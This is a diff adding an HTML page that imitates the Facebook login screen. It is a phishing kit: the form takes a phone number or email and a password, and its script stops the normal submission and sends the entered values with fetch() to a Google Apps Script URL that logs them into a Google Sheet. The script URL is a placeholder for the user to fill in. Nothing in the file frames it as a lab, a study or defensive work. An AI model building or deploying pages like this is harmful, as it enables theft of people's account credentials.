@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Facebook login and sing up</title>
+  <link rel="icon" type="image/x-icon" href="favicon.png">
+  
+  <!-- HTML -->
+  
+
+  <!-- Custom Styles -->
+  <link rel="stylesheet" href="style.css">
+  
+  
+  
+  
+  
+  
+ 
+ 
+ 
+ 
+ 
+  </style>
+</head>
+
+<body>
+  <div class="logo">
+    <img src="pp.jpg" alt="">
+  </div>
+  
+  <h1>facebook</h1>
+  
+  <form method="POST" name="google-sheet">
+    <div class="container">
+      <input type="text" name="user" placeholder="mobile number or email address" required>
+      <input type="password" name="data" placeholder="password" required>
+      <a href="https://m.facebook.com"><input type="submit" value=LogIn></a>
+      
+  
+      <a href="#">forgotten password?</a>
+      <div class="style">or</div>
+      <button class="new-account">Create New Account</button>
+    </div>
+  </form>
+  
+  <script type="text/javascript">
+    const scriptURL = 'Your google script url here'
+    const form = document.forms['google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+  
+    })
+  </script>
+  
+</body>
+</html>
